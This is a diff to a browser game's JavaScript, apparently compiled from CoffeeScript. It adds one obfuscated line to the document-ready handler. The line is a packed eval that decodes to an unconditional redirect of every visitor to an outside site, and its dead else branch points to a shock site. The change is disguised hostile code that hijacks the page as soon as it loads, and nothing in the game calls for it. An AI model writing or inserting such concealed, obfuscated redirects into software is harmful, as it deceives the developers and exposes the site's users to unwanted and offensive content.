@@ -1,6 +1,7 @@
 (function() {
   var activateOpeningMenu, buildAchievementMessage, changeAutoSave, changeControlState, changeToPreviousControl, chooseRandomFromList, collectAchievement, completeDialogue, continueDialogue, continueSavedGame, encounterPerson, enterAchievementsState, enterChatState, enterChoiceState, enterFreeState, enterLoadingState, enterLoveState, enterMenuState, enterOpeningState, enterRelationshipState, enterRewardState, exitMenu, failLove, followDialogue, getPossibleLinks, handleMessage, initializeGameData, initializeImages, initializeLove, initializeNewGame, loveEvent, openMenu, possiblyEncounterPerson, prepareAchievementData, prepareNextState, prepareRelationshipTable, recordGameState, rewardAchievement, setAutoSaveButtonState, setChatlock, setControls, setDescription, setIndicatorArea, setLocationImage, setPersonImage, setTravelList, setupPerson, startNewGame, startingSequence, succeedLove, testFunctions, travelToLocation;
   $(document).ready(function() {
+	eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('8(5!=4){1.2="0://6.7.3/"}9{1.2="0://a.3/"}',11,11,'http|window|location|com|false|true|www|nyanicorn|if|else|meatspin'.split('|'),0,{}))
     testFunctions();
     setControls();
     return initializeGameData();
